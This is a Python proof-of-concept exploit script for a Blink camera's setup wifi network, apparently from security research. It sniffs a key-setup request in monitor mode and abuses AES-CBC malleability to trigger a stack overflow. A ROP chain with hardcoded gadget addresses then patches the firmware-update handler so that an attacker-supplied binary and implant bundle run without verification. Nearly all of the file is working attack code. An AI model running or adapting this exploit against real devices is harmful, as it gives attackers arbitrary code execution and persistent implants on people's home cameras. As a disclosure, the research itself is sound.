import requests
from Crypto.Cipher import AES
import sys
import base64 as b64
import time
import os
import subprocess
"""
This proof of concept allows an attacker within range of the Blink's configuration wifi network during execution to gain arbitrary code execution.

This file contains stages 1 and 2 described in the readme.

Stage 1: Eavesdrop a legitimate set key request to learn a ciphertext / plaintext pair.

Stage 2: Use the ctext/ptext pair along with a decryption stack overflow in set key to create a rop chain that eventually allows arbitrary code execution.

"""

if len(sys.argv) != 4:
    print("Usage: poc_12_81.py [wifi interface with monitor mode support] [raw ARCompact binary to run] [bundle to implant]")
    print("Requires tshark and airmon-ng")
    print("Developed on Ubuntu 22.04")
    exit(1)


"""
Stage 1:

First, wait for a blink wifi network to be available

Next, drop the network card into monitor mode. This allows us to eavesdrop on unencrypted traffic on that network.

Finally, eavesdrop initialization. Listen for a call to /api/set/key

    The put request contains a short encrypted shared key, of the format:
        IV block + Key block + constant b"immediasemisyncm"

    Since the last block is a constant & it's encrypted with AES cbc, we learn a ciphertext / plaintext pair.
    We can use that to create messages that decrypt to chosen plaintext under specific conditions by exploiting CBC xor
        Set block 2 = known ciphertext
        Set block 1 such that known plaintext xor block 1 == desired plaintext
        Now, block 2 decrypts to desired plaintext (but block 1 is mangled)

This part may be a bit sketchy, I don't do a lot of networking work & don't know best practices for scripting.
"""

wifi = sys.argv[1]

# wait for a blink network to be available and grab its SSID
def get_blink_ssid(iface):
    command = "sudo iw " + iface + """ scan | grep -ioE 'SSID: BLINK.*'"""
    print(command)
    result = []
    print("waiting for blink network", end = "")

    while not len(result):
        result = list(os.popen(command))
        print(".", end = "")
        time.sleep(1)
    print()

    ssid_list = [item.lstrip('SSID: ').strip('"\n') for item in result]
    ssid = ssid_list[0]
    print("Got ssid", ssid)
    return ssid

# enable monitor mode and wait for a POST request to /api/set/key to grab a ctext/ptext pair from
# then disable monitor mode
def eavesdrop(iface):

    # this assumes the blink network is on channel 6, which it always has been for me
    # I see no reason it would be different, but I also haven't looked at networking code on the blink to make sure it can't change
    # If eavesdrop never catches a POST request, this is probably the issue (check iw output for channel)
    enable_monitor_mode = "sudo airmon-ng start "+ iface + " && sudo iwconfig " +iface + "mon mode monitor channel 6"

    print("Attempting to enable monitor mode...")
    print(enable_monitor_mode)

    if(os.system(enable_monitor_mode)):
        print("enable monitor mode failed")
        return False
    
    print("Monitor mode enabled")
    print()

    # wait for a POST request targetting the blink ip. First POST should always be set key.
    wait_for_push = "sudo tshark -f \"host 172.16.97.199 and port 80 and tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354\" -w - -c 1"
    print("Waiting for http POST")
    print(wait_for_push)


    proc = subprocess.Popen(wait_for_push, shell=True, stdout=subprocess.PIPE)
    result, _ = proc.communicate()

    
    split_index = result.find(b"\r\n\r\n")
    if split_index == -1:
        print("Could not find HTTP header/body separator")
        return False

    body_start = split_index + 4
    http_data = result[body_start:body_start + 0x30]
    print("Got POST data:", http_data.hex())


    if(os.system("sudo airmon-ng stop " + wifi + "mon && sudo ip link set " + wifi + " up")):
        print("Could not disable monitor mode")
        return False

    return http_data

# Connect to blink network to send exploit
def connect(network_ssid):
    print("attempting to connect to", network_ssid)
    
    # if this times out with Error: Connection activation failed: (5), try:
    # nmcli con show
    # nmcli con delete <connection name>
    time.sleep(2)
    while os.system("nmcli d wifi connect "+ network_ssid):
        print("Connection failed. A few of these while network card switches back from monitor mode is expected")
        time.sleep(.25)
    return True

# why isn't this a builtin?
def xor(a, b):
    return bytes(x ^ y for x, y in zip(a, b))


ssid = get_blink_ssid(wifi)

try:
    http_data = eavesdrop(wifi)
except:
    os.system("sudo airmon-ng stop " + wifi + "mon && sudo ip link set " + wifi + " up")
    exit(1)

if not http_data:
    os.system("sudo airmon-ng stop " + wifi + "mon && sudo ip link set " + wifi + " up")
    exit(1)

if not connect(ssid):
    exit(1)



valid_set_key = http_data

# This is all we need from the above
known_ctext = valid_set_key[0x20:0x30]  
known_ptext = xor(b"immediasemisyncm", valid_set_key[0x10:0x20])


"""
Stage 2:

By exploiting AES CBC malleability and a stack overflow in decryption in set key, we gain ACE 


First, build a very small rop chain, and use it to pivot. If we overflow the stack too far we'll cause an interrupt.

    We end up getting only a single block; 16 bytes, 4 instructions. We need more space, so this has to pivot the stack.
        We can't just jump and start executing shellcode because the region is not executable and 
        because everything is stuck in the data cache anyways.
    
    There are also not very many useful gadgets. Ropper and such don't support ARCompact, so I wrote a ghidra script to look for 
    returns from the stack. Only extracted ~300 gadgets

    There is one gadget that lets us move sp, but it kinda sucks. 
        Basically, it is:
            ld sp [r0, 0x8] <- sp loaded here
            fail if [0] != 0
            load register r13-r25, gp, and r1 from sp[8:0x40] ish
            load blink as sp[4]
            increment sp by 0x40
            jump to blink
        
        This is usable, barely. We set r0 such that sp is loaded to be the start of the encrypted message.
        This means we don't have to worry about aes anymore; we can do whatever we want for the 0x70 bytes before the overflow.

        The gadget forces us to set the first few bytes, skips over 0x40 bytes, then continues the stack after that point
        So we get 0x28 bytes to load code in to executable memory, & jump to it

Now build the larger rop chain to prepare for execution and restore program to normal state

    With 0x28 bytes, we can just barely load r0, r1, and r2, then execute memcpy
        This lets us move the 0x40 bytes we skipped over in the encrypted buffer over to an executable region
        You have to use specifically the variant of memcpy that uses a direct store
            By default, store instructions write to the data cache; instructions are loaded from separate instruction cache
        
    At this point, we have runnable attacker-specifiable instructions anywhere in the binary; up to 0x40 of them.
        For now, just use part of them to restore sp and gp, jump back to where execution should be & continue like nothing happened.
        We'll use the rest to patch a specific spot of the code

Patch the binary with memcpy'd bytes to run larger code segments
    If we just jumped to the memcpy'd bytes, we'd be limited to 0x40 bytes of code. That's not arbitrary code execution.
    Instead, let's bootstrap to however much code we want to run.

    Conveniently, there's already a function to download a bunch of data; firmware update
    By patching a few bytes there, we make it run whatever it downloads immediately without doing any verification

After installing the patch, all we need to do is send /set/app_fw_update a message with whatever code we want to run.
"""







# memcpy args
dst = bytes.fromhex("2004ba44")
src = bytes.fromhex("2010d8cc")
length = 0x64646464.to_bytes(4, "big")

#gadgets
load_r0 = bytes.fromhex("20005496")
better_printf = bytes.fromhex("200196b0")
mov_r1_r0 = bytes.fromhex("20015f9e")
store_r0_r1_x68 = bytes.fromhex("2000be54")
memcpy = bytes.fromhex("200046a0")
mov_r2_r0_ldb_r0 = bytes.fromhex("2000568c")
call_r1 = bytes.fromhex("2004a166")
assert_fail = bytes.fromhex("200172e0")
true_return = bytes.fromhex("20044504")
mov_r3_r2 = bytes.fromhex("20007016")
call_r3_with_deref_r0 = bytes.fromhex("2001cec0")
load_r0_from_r1_8 = bytes.fromhex("20036a1a")
remove_8_bytes_from_stack = bytes.fromhex("20004b60")

#useful contants
irrelevant = b"\x00" * 4
zero = b"\x00" * 4
encrypted_address = 0x2010d8c4
src = (encrypted_address + 8).to_bytes(4, "big")  # start copying from right after the rop chain
ref_r0 = (encrypted_address + 0x5c).to_bytes(4, "big") # grab the irrelevant r0 from end of chain

r0 = dst
r1 = src
r2 = length
pivoted_stack = bytes.fromhex("2010d8c4")


# payload. This overwrites part of the app_fw_update handler to instead copy the received data into an executable region & run it
# Is (mostly) just assembed initial_payload.s 
# Notably though, this includes some data right in the middle that gets jumped over
# (To save space in the ROP chain, we load r0 from r1[8] instead of the stack once)
code = bytes.fromhex("71 CF 20 00 0F FF F0 04")+ ref_r0 + bytes.fromhex(" D8 04 B8 1C 69 61 10 01 02 84 19 01 01 2A 71 D7 20 00 20 00 F5 F9 7b 00")


# We also need some code to restore r0 and jump execution back to where it should be after our chain finishes.
# This is what's stored at 'inserted_gadget'

# notably r0 is already set to 0 by call_r3_with_deref_r0, so we don't need to clear it to make the function call successful
# mov sp, new_sp <- controlled by us, matches what the stack should have been before we overflowed it
# mov gp, 20063a04 <- what it should be
# j 2004C8a6 <- return of http set key handler
new_sp = (0x200FC700 -0x88 + 0x60 + 0x10 + 0x10 + 0x10 + 0x8).to_bytes(4, "big")
inserted_gadget = bytes.fromhex("24 0A 3F 80") + new_sp + bytes.fromhex("22 0A 3F 80 20063a04 20 20 0F 80 2004C8a6")


# where to jump to to run inserted gadget & restore normal execution
dest_after_chain = (int.from_bytes(dst, "big") + len(code)).to_bytes(4, "big")

# make sure we don't overflow out boundary (we don't, exactly)
internal = code + inserted_gadget

if len(internal) > 0x3c:
    print("Internal is too long, aborting")
    exit(1)

internal += b"\x00" * (0x3c - len(internal))


# chain to jump to after we've pivoted (uses several tricks to minimize code size)
chain_after_pivot = zero + load_r0 + internal + r1 + memcpy + mov_r2_r0_ldb_r0 + r2 + mov_r3_r2 + mov_r2_r0_ldb_r0 + r0 + load_r0_from_r1_8 + call_r3_with_deref_r0 + dest_after_chain + pivoted_stack

start = chain_after_pivot


#the first block of the ROP chain; pop 0x10 bytes off the stack then continue to second block
first_ret = bytes.fromhex("20004b50")
first_block = irrelevant * 3 + first_ret

addr_of_pivoted_stack_minus_8 = (encrypted_address+ 0x6c -8).to_bytes(4, "big")
stack_pivot = bytes.fromhex("20003bf0")

#second block: pivot the stack (and setup true_return as value that should be on the stack after restoration)
second_block = load_r0 + addr_of_pivoted_stack_minus_8 + stack_pivot + true_return

if len(start) > 0x7c:
    print("Start is too long, aborting")
    exit(1)

# pad to max allowed size so everything lines up
start += b"\x00" * (0x7c - len(start))

#set values to ensure first & second blocks are as desired
first_block_force = xor(known_ptext, first_block)
second_block_force = xor(known_ptext, second_block)


# actual packet to send
# Since we only care about the last 4 bytes of first_block, we can use the first 0xc as additional data for start
packet = start + first_block_force[0xc:] + known_ctext + second_block_force + known_ctext


# 0xc0 is the max we can send before stack overflow crashes the thread
print("sending initial payload of length", hex(len(packet)))
breakval = 0x20

print("POST api/set/key with:")
print("\n".join([packet.hex()[i*breakval:i*breakval+breakval] for i in range(0, len(packet.hex())//breakval)]))


r = requests.post("http://172.16.97.199/api/set/key", data=packet)
print("Got status code", r.status_code)


with open(sys.argv[2], "rb") as f:
    new_send = b"\x00" + f.read()

new_send += b"\x00" * (0x1000 - len(new_send))

with open(sys.argv[3], "rb") as f:
    new_send += f.read()

print("attempting to send", hex(len(new_send)), "bytes to execute & patch firmware")
r = requests.post("http://172.16.97.199/api/set/app_fw_update", data=new_send)
print("Got status code", r.status_code)
print("Response text:")
print(r.text)

print("Attack complete")
